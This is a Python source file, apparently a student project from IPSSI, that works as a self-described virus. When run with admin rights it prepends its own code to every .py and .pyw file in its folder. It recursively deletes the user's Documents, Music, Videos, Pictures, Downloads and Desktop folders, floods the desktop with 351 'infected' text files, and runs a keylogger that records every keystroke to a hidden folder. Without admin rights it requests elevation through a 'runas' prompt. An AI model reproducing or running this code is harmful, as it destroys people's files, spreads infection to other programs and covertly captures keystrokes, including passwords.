# DebutVirus

#CodeInjecté

# FinVirus

import sys,glob
import itertools,subprocess,sys,os
import time
import ctypes
import shutil

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

#Grande boucle IF qui englobe tout le code pour l'exec en tant qu'admin
if is_admin():

    #----------Auto-réplication----------

    #Le virus charge son propre code
    virus_code = []
    with open(sys.argv[0], 'r') as f:
        lines = f.readlines()

    # Permet de vérifier le code du virus "# DebutVirus" et "# FinVirus\n" servent de délimitateurs
    EstInfecte = False
    for line in lines:
        if line == "# DebutVirus":
            EstInfecte = True
        if not EstInfecte:
            virus_code.append(line)
        if line == "# FinVirus\n":
            break

    #----------Infection de fichiers----------

    # Détection des fichiers .py et .pyw
    seek_Python_Files = glob.glob('*.py') + glob.glob('*.pyw')

    for file in seek_Python_Files:
        with open(file, 'r') as f:
            file_code = f.readlines()
        
        corrompu = False
        #Si il y a # DebutVirus\n au début = NE PAS injecter le code
        for line in file_code:
            if line == "# DebutVirus\n":
                corrompu = True
                break
        
        #Si il n'y a pas # DebutVirus\n au début = injecter le code
        if not corrompu:
            final_code = []
            final_code.extend(virus_code)
            final_code.extend('\n')
            final_code.extend(file_code)
            
            with open(file, 'w') as f:
                f.writelines(final_code)

    print("")
    print("Infection des fichiers en cours ...")
    print("")

    #----------------Delete les fichiers utilisateur---------------

    #ignore_errors=True = Delete aussi les read only files
    pathDocument = str(os.path.join(os.environ['USERPROFILE'], "Documents"))
    shutil.rmtree(pathDocument, ignore_errors=True)

    pathMusic = str(os.path.join(os.environ['USERPROFILE'], "Music"))
    shutil.rmtree(pathMusic, ignore_errors=True)

    pathVideos = str(os.path.join(os.environ['USERPROFILE'], "Videos"))
    shutil.rmtree(pathVideos, ignore_errors=True)

    pathPictures = str(os.path.join(os.environ['USERPROFILE'], "Pictures"))
    shutil.rmtree(pathPictures, ignore_errors=True)

    pathDownloads = str(os.path.join(os.environ['USERPROFILE'], "Downloads"))   
    shutil.rmtree(pathDownloads, ignore_errors=True)

    pathDesktop = str(os.path.join(os.environ['USERPROFILE'], "Desktop"))   
    shutil.rmtree(pathDesktop, ignore_errors=True)

    #----------SPAM fichiers bureau----------

    #Aller sur le bureau de l'utilisateur actuel
    path = str(os.path.join(os.environ['USERPROFILE'], "Desktop"))

    print("INFECTION DU BUREAU EN COURS...")

    #Création de 350 fichiers texte 
    for x in range(351):
        file = open(path+"\INFECTED-IPSSI-%d.txt" % x, "w")
        file.write("Votre PC à été infécté par un étudiant de l'IPSSI")
        file.close()

    #----------------KEYLOGGER---------------

    from pynput.keyboard import Key, Listener
    import logging
    import os
    from datetime import datetime

    class Keylogger:
            
        #Fonction de création du répertoire log
        def create_log_directory(classKeylogger):
            repertoire_parent = "C:\\"
            repertoire_a_creer = ".Keylogger"
            classKeylogger.fullpath_directory = os.path.join(repertoire_parent, repertoire_a_creer)
            if not os.path.exists(classKeylogger.fullpath_directory):
                os.mkdir(classKeylogger.fullpath_directory)
    
        @staticmethod
        def on_press(key):
            try:
                logging.info(str(key))
            except Exception as e:
                logging.info(e)       
        def write_log_file(classKeylogger):
            # Formattage de la date / heure
            time = str(datetime.now())[:-7].replace(" ", "-").replace(":", "")
            # Logging dans le fichier
            logging.basicConfig(
                    filename=(os.path.join(classKeylogger.fullpath_directory, time) + "-keylog.txt"),
                    level=logging.DEBUG, 
                    format= "--> [%(asctime)s]: %(message)s",
                )
            
            with Listener(on_press=classKeylogger.on_press) as listener:
                listener.join()
        
    # Call des fonctions
    if __name__ == "__main__":
        klogs = Keylogger()
        klogs.create_log_directory()
        klogs.write_log_file()

else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
